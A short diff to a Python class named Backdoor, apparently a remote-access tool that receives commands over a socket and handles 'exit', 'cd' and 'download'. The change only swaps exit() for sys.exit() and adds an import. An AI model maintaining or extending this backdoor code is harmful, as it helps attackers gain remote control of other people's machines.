@@ -7,6 +7,7 @@ import json
 import os
 import socket
 import subprocess
+import sys
 
 
 class Backdoor:
@@ -52,7 +53,7 @@ class Backdoor:
                 if command_received[0] == "exit":
                     command_result = ""
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command_received[0] == "cd" and len(command_received) > 1:
                     command_result = self.change_working_directory(command_received[1])
                 elif command_received[0] == "download":
